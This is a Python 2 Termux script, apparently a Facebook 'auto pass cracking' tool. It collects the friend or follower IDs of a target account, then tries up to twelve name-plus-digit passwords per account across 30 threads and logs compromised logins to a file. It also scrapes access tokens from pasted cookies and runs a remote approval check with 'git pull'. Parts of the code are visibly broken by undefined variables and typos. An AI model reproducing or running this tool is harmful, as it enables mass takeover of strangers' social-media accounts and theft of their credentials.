#!/usr/bin/python2
# coding=utf-8

import os
import sys
import time
import datetime
import re
import threading
import json
import random
import requests
import hashlib
import cookielib
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Mr.Jam'
__copyright = 'All rights reserved . Copyright  Mr.Jam'
os.system('termux-setup-storage')

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;],'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m""\033[0;97m""\033[1;32m"
c2 = "\033[0;97m""\033[1;32m""\033[0;97m"
c3 = "\033[1;31m""\033[0;97m""\033[1;31m"
os.system('git pull')
os.system('clear')
logo = ('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Muskan Noor x Zahra Zohaib)\n➣ Ref By :     (Ahmed Gondal x ASAD x Janzada Khan) \n-----------------------------------------------" | lolcat')  
def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/jam-shahrukh/jam/main/jam/id.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed'
        print ''
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ''
        print ' \033[1;92mCopy token id and send to Jam Shahrukh'
        print ''
        print ' \033[1;92mYour id: ' + to
        print ''
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923053176060')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \033[1;92mCopy and press enter , And Send Me On +923053176060'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923053176060')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;93m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\033[1;93m Your country: ' + country
    time.sleep(2)
    print ''
    print '\033[1;92m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \033[1;92mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Login menu~~~~'
        print ''
        print '\033[1;92m[1] Login with FaceBook'
        print '\033[1;92m[2] Login with token'
        print '\033[1;92m[3] Login with cookies'
        print ''
        log_menu_s()



def log_menu_s():
    s = raw_input(' \033[1;93mSelect One: ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin with id/pass'
    print ''
    lid = raw_input('\033[1;92m Id/mail/no: ')
    pwds = raw_input(' \033[1;93mPassword: ')
    
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' User must verify account before login'
            print ''
            raw_input('\033[1;92m Press enter to try again ')
            log_fb()
        else:
            print ''
            print ' Id/Pass may be wrong'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')



def log_token():
    os.system('clear')
    print logo
    print ''
    print '\033[1;93mLogin with token'
    print ''
    tok = raw_input(' \033[1;92mPaste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin Cookies'
    print ''
    
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie }
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()



def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\033[1;31;1mLogin FB id to continue'
        print ''
        time.sleep(1)
        log_menu()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print ''
    print '  \033[1;92mLogged in user: ' + z
    print ''
    print ' \033[1;93m Active token: ' + tok
    print ''
    print ' ------------------------------------------ '
    print ''
    print '\033[1;92m[1] Crack with auto password' 
    print '\033[1;92m[2] Extract Link For File' 
    print '\033[1;92m[3] View token'
    print '\033[1;92m[4] Logout'
    print '\033[1;92m[5] Delete trash files'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\033[1;92mSelect One: ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
	print '[!] Please Wait While Page Is Loding.'
	os.system('python2 .ump.py')
	time.sleep(1)
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
    elif ms == '5':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()

def crack():
    global toket
    
    try:
	toket=open('login.txt','r').read()
    except (KeyError, IOError):
	os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1m~~~~ Auto pass cracking ~~~~'
    print ''
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()
    
def auto_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1m~~~~ Auto pass cracking ~~~~'
    print ''
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;93mSelect One: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
        print ''
        print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
	pass9 = raw_input(' \033[1;92m[9]Password: ')
	pass10 = raw_input(' \033[1;92m[10]Password: ')
	pass11 = raw_input(' \033[1;92m[11]Password: ')
	pass12 = raw_input(' \033[1;92m[12]Password: ')
        idt = raw_input(' \033[1;93m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~Auto pass public cracking~~~~'
            print ''
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~'
        print ''
        print ' \033[1;93mFor example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
	pass9 = raw_input(' \033[1;92m[9]Password: ')
	pass10 = raw_input(' \033[1;92m[10]Password: ')
	pass11 = raw_input(' \033[1;92m[11]Password: ')
	pass12 = raw_input(' \033[1;92m[12]Password: ')
        idt = raw_input(' \033[1;93m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Auto pass File cracking ~~~~'
        print ''
        print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
	pass9 = raw_input(' \033[1;92m[9]Password: ')
	pass10 = raw_input(' \033[1;92m[10]Password: ')
	pass11 = raw_input(' \033[1;92m[11]Password: ')
	pass12 = raw_input(' \033[1;92m[12]Password: ')
        
        try:
	    idlist= raw_input('[+] File Name: ')
	    for line in open(idlist ,'r').readlines():
	        id.append(line.strip())
	except IOError:
	    print"[!] File Not Found."
	    raw_input('Press Enter To Back. ')
	    crack()
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;93mCrack Running '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mJAM KING OF FACEBOOK\x1b[0;97m'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass1
                cp = open('HOP_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
			else:
                            pass5 = name.lower() + p5
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass5
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
			    else:
			        pass6 = name.lower() + p6
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass6
                                    cp = open('HOP_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
			        else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass7
                                        cp = open('HOP_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
				    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass8
                                            cp = open('HOP_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
				        else:
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass9
                                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass9
                                                cp = open('HOP_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
					    else:
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers = header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass10
                                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass10
                                                    cp = open('HOP_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
			                        else:
                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass11
                                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass11)
                                                    elif 'www.facebook.com' in q['error']:
                                                        print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass12
                                                        cp = open('HOP_CP.txt', 'a')
                                                        cp.write(uid + ' | ' + pass11 + '\n')
                                                        cp.close()
                                                        cps.apppend(uid + pass11)
			                            else:
                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass12
                                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + pass12)
                                                        elif 'www.facebook.com' in q['error']:
                                                            print '\x1b[1;93m[JAM-CP] ' + uid + ' | ' + pass12
                                                            cp = open('HOP_CP.txt', 'a')
                                                            cp.write(uid + ' | ' + pass12 + '\n')
                                                            cp.close()
                                                            cps.apppend(uid + pass12)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \033[1;92mCrack Done'
    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \033[1;93mPress enter to back')
    auto_crack()



if __name__ == '__main__':
    reg()
